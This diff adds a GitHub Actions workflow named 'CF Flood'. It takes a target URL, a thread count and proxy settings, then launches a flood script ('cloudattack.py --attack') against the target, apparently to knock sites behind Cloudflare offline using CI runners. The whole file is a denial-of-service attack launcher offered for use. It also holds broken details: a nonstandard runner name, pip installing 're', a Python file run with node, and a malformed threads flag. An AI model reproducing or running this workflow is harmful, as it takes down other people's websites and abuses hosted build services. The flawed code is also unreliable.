@@ -1,0 +1,45 @@
+name: CF Flood
+
+on:
+  workflow_dispatch:
+    inputs:
+      urltgt:
+        description: "URL Target"
+        required: true
+      thread:
+        description: "Threads"
+        required: true
+        default: "6000"
+      proxy:
+        description: "Proxy"
+        required: true
+        default: "true"
+      upproxy:
+        description: "Update Proxy"
+        required: true
+        default: "true"
+      
+
+jobs:
+  build:
+    runs-on: debian-latest
+    steps:
+    - uses: actions/checkout@v3
+    - name: Set up Python 3.9
+      uses: actions/setup-python@v3
+      with:
+        python-version: 3.9
+    - name: Set up Node.js 16
+      uses: actions/setup-node@v3
+      with:
+        node-version: 16
+    - name: Install dependencies
+      run: |
+        python -m pip install --upgrade pip
+        pip install re argparse bs4 urllib3
+        if [ -f requirements.txt ]; then pip install -r requirements.txt; fi
+        npm install minimist
+        npm install cloudscraper
+    - name: Starting Flood...
+      run: |
+        node cloudattack.py --attack ${{ github.event.inputs.urltgt }} --threads${{ github.event.inputs.thread }} --proxy ${{ github.event.inputs.proxy }} --updateproxy ${{ github.event.inputs.upproxy }}
